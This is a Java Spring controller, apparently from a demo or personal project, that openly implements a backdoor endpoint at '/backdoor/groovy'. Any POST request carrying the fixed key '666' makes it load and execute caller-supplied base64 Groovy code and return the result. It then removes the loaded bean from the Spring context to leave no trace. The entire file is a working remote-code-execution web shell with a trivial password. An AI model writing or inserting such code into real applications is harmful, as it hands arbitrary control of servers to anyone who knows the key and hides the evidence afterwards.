package com.zhy.other.groovy.controller;

import cn.hutool.extra.spring.SpringUtil;
import com.zhy.other.groovy.dto.BackDoorGroovyDto;
import com.zhy.other.groovy.loader.GroovyLoader;
import com.zhy.other.groovy.loader.ILoader;
import org.springframework.beans.factory.support.DefaultListableBeanFactory;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;


/**
 * GroovyBackdoor
 *
 * @author zhouhongyin
 * @since 2023/5/20 12:37
 */
@RequestMapping("/backdoor/groovy")
@RestController
public class BackDoorGroovyController {
    @Resource
    private GroovyLoader groovyLoader;

    @Resource
    private ApplicationContext applicationContext;


    @PostMapping
    public String process(@RequestBody BackDoorGroovyDto param) throws Exception {
        if (!"666".equals(param.getKey())) {
            return "0";
        }

        String beanName = param.getBeanName();
        Object myClassLoader = groovyLoader.getBean(beanName, param.getJavaScriptBase64());
        ILoader loader = (ILoader) myClassLoader;
        String resp = loader.process();

        // 彻底移除bean（包括实例缓存）
        ConfigurableApplicationContext configurableContext = (ConfigurableApplicationContext) applicationContext;
        DefaultListableBeanFactory beanFactory = (DefaultListableBeanFactory) configurableContext.getBeanFactory();

        // 移除bean实例缓存
        beanFactory.destroySingleton(beanName);
        // 移除BeanDefinition
        beanFactory.removeBeanDefinition(beanName);

        return resp;
    }


}
